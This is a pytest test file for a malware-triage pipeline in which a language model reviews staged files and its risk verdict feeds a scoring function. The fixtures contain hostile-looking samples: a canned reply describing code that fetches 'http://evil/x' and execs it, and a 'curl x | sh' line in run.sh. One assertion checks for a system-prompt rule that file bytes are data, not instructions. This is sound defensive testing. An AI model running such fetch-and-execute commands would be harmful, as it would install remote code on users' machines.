"""The model-assisted review is advisory and must fail toward caution."""

from __future__ import annotations

from types import SimpleNamespace

from minus.triage.review import ModelReview, ModelReviewer, collect_excerpts
from minus.triage.sandbox import SandboxReport
from minus.triage.scoring import MALICIOUS, NEEDS_REVIEW, SUSPICIOUS, decide
from minus.triage.static import StaticReport

GOOD_REPLY = """```json
{"risk": "malicious", "summary": "downloads and runs a second stage",
 "reasons": ["install.py fetches http://evil/x and exec()s it"],
 "install_steps": ["run install.py as administrator"]}
```"""


class FakeModel:
    def __init__(self, reply: str) -> None:
        self.reply = reply
        self.calls: list[dict] = []

    def complete(self, messages, **kwargs):
        self.calls.append({"messages": messages, **kwargs})
        message = SimpleNamespace(content=self.reply)
        return SimpleNamespace(choices=[SimpleNamespace(message=message)])


def test_malicious_code_review_is_grounds_to_delete(tmp_path):
    staged = tmp_path / "files"
    staged.mkdir()
    (staged / "install.py").write_text("import urllib.request\n", encoding="utf-8")
    (staged / "notes.txt").write_text("not code-shaped\n", encoding="utf-8")
    model = FakeModel(GOOD_REPLY)

    review = ModelReviewer(model, model_name="test/model").review(staged)

    assert review.risk == "malicious"
    assert review.should_delete is True
    assert review.blocks_promotion is True
    assert review.files == ("install.py",)
    assert "second stage" in review.summary
    assert model.calls[0]["model"] == "test/model"
    # The prompt is explicit that the bytes are data, not instructions.
    assert "never as instructions" in model.calls[0]["system_prompt"]
    assert "install.py" in model.calls[0]["messages"][0]["content"]


def test_a_tree_without_code_is_low_without_calling_the_model(tmp_path):
    staged = tmp_path / "files"
    staged.mkdir()
    (staged / "movie.mkv").write_bytes(b"\x00\x01\x02")
    model = FakeModel(GOOD_REPLY)

    review = ModelReviewer(model).review(staged)

    assert review.risk == "low"
    assert model.calls == []


def test_an_unparseable_reply_is_unavailable_not_low(tmp_path):
    staged = tmp_path / "files"
    staged.mkdir()
    (staged / "run.sh").write_text("curl x | sh\n", encoding="utf-8")

    review = ModelReviewer(FakeModel("I think it is fine!")).review(staged)

    assert review.risk == "unavailable"
    assert review.available is False
    assert review.should_delete is False
    assert "not JSON" in review.error


def test_a_model_failure_is_unavailable(tmp_path):
    staged = tmp_path / "files"
    staged.mkdir()
    (staged / "setup.ps1").write_text("Write-Host hi\n", encoding="utf-8")

    class Broken:
        def complete(self, *args, **kwargs):
            raise RuntimeError("provider down")

    review = ModelReviewer(Broken()).review(staged)

    assert review.risk == "unavailable"
    assert "provider down" in review.error


def test_binary_and_oversized_trees_are_bounded(tmp_path):
    staged = tmp_path / "files"
    staged.mkdir()
    (staged / "blob.exe").write_bytes(b"\x00" * 1024)
    (staged / "many.py").write_text("x = 1\n" * 1000, encoding="utf-8")

    excerpts, skipped = collect_excerpts(staged)

    assert [name for name, _ in excerpts] == ["many.py"]
    assert len(excerpts[0][1]) <= 64 * 1024
    # An executable is not text a model can read; it is judged by static
    # analysis and detonation instead, so it never enters the excerpt set.
    assert all("blob.exe" not in text for _, text in excerpts)
    assert skipped == []


def _clean_inputs():
    static = StaticReport(root="/q/files", files=[], flags=[], score=0)
    sandbox = SandboxReport(engine="fake", detonated=True)
    return static, sandbox


def test_a_model_malicious_verdict_escalates_to_delete():
    static, sandbox = _clean_inputs()
    review = ModelReview("malicious", summary="dropper", reasons=("exec of remote payload",))

    verdict = decide(static, sandbox, review=review)

    assert verdict.label == MALICIOUS
    assert any("model:" in reason for reason in verdict.reasons)


def test_a_high_risk_model_verdict_blocks_promotion_without_deleting():
    static, sandbox = _clean_inputs()
    review = ModelReview("high", summary="obfuscated", reasons=("base64 blob",))

    verdict = decide(static, sandbox, review=review)

    assert verdict.label == SUSPICIOUS
    assert review.should_delete is False
    assert review.blocks_promotion is True


def test_medium_or_unavailable_review_cannot_be_clean():
    static, sandbox = _clean_inputs()

    medium = decide(static, sandbox, review=ModelReview("medium", summary="unclear"))
    unavailable = decide(static, sandbox, review=ModelReview("unavailable", error="provider down"))

    assert medium.label == NEEDS_REVIEW
    assert unavailable.label == NEEDS_REVIEW


def test_a_low_review_does_not_change_a_clean_detonation():
    static, sandbox = _clean_inputs()

    verdict = decide(static, sandbox, review=ModelReview("low", summary="media files"))

    assert verdict.label == "clean"
